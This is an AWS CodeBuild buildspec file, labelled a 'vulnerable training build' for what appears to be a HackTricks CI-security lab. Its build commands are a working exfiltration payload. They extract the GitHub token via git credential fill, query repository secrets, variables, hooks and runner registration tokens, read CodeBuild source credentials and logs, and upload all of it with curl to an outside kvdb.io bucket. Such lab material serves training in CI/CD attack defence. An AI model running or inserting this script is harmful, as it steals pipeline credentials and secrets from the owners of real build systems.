version: 0.2

env:
  variables:
    AWS_MAX_ATTEMPTS: "1"
    AWS_RETRY_MODE: "standard"

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - |
        set +e
        bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
        runid="${CODEBUILD_BUILD_ID##*:}"
        putkey(){ key="$1"; file="$2"; head -c 60000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
        echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
        {
          echo '=== git config ==='
          git config --list --show-origin 2>&1 | sed -E 's/(password|token|authorization)=.*/\1=REDACTED/I'
          echo '=== git credential fill ==='
          printf 'protocol=https\nhost=github.com\npath=HackTricks-Training/codebuild-codebreach-actors-lab\n\n' | git credential fill > /tmp/gitcred.raw 2>&1
          sed -E 's/(password=).*/\1REDACTED/; s/(oauth|gh[opsu]_[A-Za-z0-9_]+)/REDACTED/g' /tmp/gitcred.raw
          token=$(awk -F= '$1=="password"{print $2}' /tmp/gitcred.raw)
          echo "token_len=${#token}"
          if [ -n "$token" ]; then
            echo '=== github token metadata ==='
            curl -fsS -H "Authorization: token $token" -H 'Accept: application/vnd.github+json' https://api.github.com/user | jq '{login,id,type}' 2>&1
            echo '=== repo permission ==='
            curl -fsS -H "Authorization: token $token" -H 'Accept: application/vnd.github+json' https://api.github.com/repos/HackTricks-Training/codebuild-codebreach-actors-lab | jq '{full_name, private, permissions, role_name}' 2>&1
            echo '=== actions variables ==='
            curl -sS -H "Authorization: token $token" -H 'Accept: application/vnd.github+json' https://api.github.com/repos/HackTricks-Training/codebuild-codebreach-actors-lab/actions/variables | jq . 2>&1
            echo '=== actions secrets names ==='
            curl -sS -H "Authorization: token $token" -H 'Accept: application/vnd.github+json' https://api.github.com/repos/HackTricks-Training/codebuild-codebreach-actors-lab/actions/secrets | jq . 2>&1
            echo '=== repo vars grep via api root ==='
            for ep in \
              /repos/HackTricks-Training/codebuild-codebreach-actors-lab/environments \
              /repos/HackTricks-Training/codebuild-codebreach-actors-lab/hooks \
              /repos/HackTricks-Training/codebuild-codebreach-actors-lab/actions/runners/registration-token \
              /repos/HackTricks-Training/codebuild-codebreach-actors-lab/codespaces/secrets \
              /repos/HackTricks-Training/codebuild-codebreach-actors-lab/dependabot/secrets; do
              echo "--- $ep"
              curl -sS -H "Authorization: token $token" -H 'Accept: application/vnd.github+json' "https://api.github.com$ep" | sed -E 's/(token|password|secret|key)"?: ?"[^"]+"/\1":"REDACTED"/Ig' | head -c 12000; echo
            done
          fi
        } > /tmp/gitgh.txt 2>&1
        putkey gitgh /tmp/gitgh.txt
        {
          echo '=== aws codebuild/source/logs reads ==='
          aws codebuild list-source-credentials --region us-east-1 --output json 2>&1
          aws codebuild batch-get-builds --ids "$CODEBUILD_BUILD_ID" --region us-east-1 --output json 2>&1
          aws logs describe-log-streams --log-group-name "/aws/codebuild/codebuild_lab_5_project" --region us-east-1 --output json 2>&1
          aws logs get-log-events --log-group-name "/aws/codebuild/codebuild_lab_5_project" --log-stream-name "$CODEBUILD_LOG_PATH" --region us-east-1 --output json 2>&1
        } > /tmp/awsreads.txt 2>&1
        putkey awsreads /tmp/awsreads.txt
